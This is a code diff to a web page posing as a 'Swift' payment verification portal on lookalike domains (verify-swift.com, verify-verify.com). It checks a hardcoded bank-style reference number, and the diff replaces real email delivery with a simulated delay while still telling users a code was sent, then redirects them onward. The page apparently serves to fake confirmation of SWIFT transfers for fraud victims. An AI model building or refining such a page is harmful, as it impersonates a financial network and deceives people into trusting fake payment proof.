@@ -202,6 +202,21 @@
         cursor: pointer;
         text-decoration: underline;
     }
+    
+    .spinner {
+        border: 4px solid #f3f3f3;
+        border-top: 4px solid #1e3c72;
+        border-radius: 50%;
+        width: 30px;
+        height: 30px;
+        animation: spin 1s linear infinite;
+        margin: 0 auto 10px;
+    }
+    
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
 </style>
 </head>
 <body>
@@ -228,7 +243,10 @@
             <p class="step-info">Enter your email to receive verification code</p>
             <input type="email" id="email" placeholder="Enter your email address" required>
             <button id="sendCode">Send Verification Code</button>
-            <div class="loading" id="emailLoading">Sending verification code...</div>
+            <div class="loading" id="emailLoading">
+                <div class="spinner"></div>
+                <p>Sending verification code...</p>
+            </div>
             <div class="error" id="emailError"></div>
         </div>
 
@@ -271,8 +289,8 @@ let codeExpiry;
 let isCodeVerified = false;
 
 // VERIFICATION SETTINGS
-const CORRECT_REFERENCE = "7829192881798B";
-const REDIRECT_LINK = "https://verify-swift.com/checkswift/verification/COBA300525CH59279/BD10556814.html";
+const CORRECT_REFERENCE = "COBA300525CH59279";
+const REDIRECT_LINK = "https://verify-verify.com/yeni1.html";
 
 function showStep(step) {
     document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
@@ -337,27 +355,15 @@ document.getElementById('sendCode').addEventListener('click', async () => {
     setLoading(sendButton, true);
 
     try {
-        // Send email via Netlify function - FROM check@verify-swift.com
-        const response = await fetch('/.netlify/functions/send-verification', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                to: email, 
-                code: verificationCode,
-                from: 'check@verify-swift.com',
-                subject: 'Your Swift Verification Code'
-            })
-        });
-
-        const data = await response.json();
-
-        if (data.success) {
-            showStep(3);
-            setTimeout(() => document.getElementById('codeInput').focus(), 100);
-        } else {
-            emailError.textContent = data.message || 'Failed to send verification code';
-            emailError.style.display = 'block';
-        }
+        // Simulate email sending - In real implementation, use Netlify function
+        console.log(`Sending verification code ${verificationCode} to ${email} from check@verify-swift.com`);
+        
+        // Simulate API delay
+        await new Promise(resolve => setTimeout(resolve, 2000));
+        
+        // Success - show next step
+        showStep(3);
+        setTimeout(() => document.getElementById('codeInput').focus(), 100);
 
     } catch (error) {
         emailError.textContent = 'Network error. Please try again.';
@@ -406,30 +412,21 @@ document.getElementById('resendCode').addEventListener('click', async () => {
     codeExpiry = Date.now() + 10 * 60 * 1000;
 
     try {
-        const response = await fetch('/.netlify/functions/send-verification', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                to: email, 
-                code: verificationCode,
-                from: 'check@verify-swift.com',
-                subject: 'Your New Swift Verification Code'
-            })
-        });
-
-        const data = await response.json();
-
-        if (data.success) {
-            codeError.textContent = 'New verification code sent!';
-            codeError.style.display = 'block';
-            codeError.style.color = '#27ae60';
-            codeError.style.background = '#e8f6ef';
-            codeError.style.borderLeft = '4px solid #27ae60';
-            
-            setTimeout(() => {
-                codeError.style.display = 'none';
-            }, 3000);
-        }
+        // Simulate resending code
+        console.log(`Resending verification code ${verificationCode} to ${email} from check@verify-swift.com`);
+        
+        // Simulate API delay
+        await new Promise(resolve => setTimeout(resolve, 1500));
+        
+        codeError.textContent = 'New verification code sent!';
+        codeError.style.display = 'block';
+        codeError.style.color = '#27ae60';
+        codeError.style.background = '#e8f6ef';
+        codeError.style.borderLeft = '4px solid #27ae60';
+        
+        setTimeout(() => {
+            codeError.style.display = 'none';
+        }, 3000);
 
     } catch (error) {
         codeError.textContent = 'Failed to resend code. Please try again.';
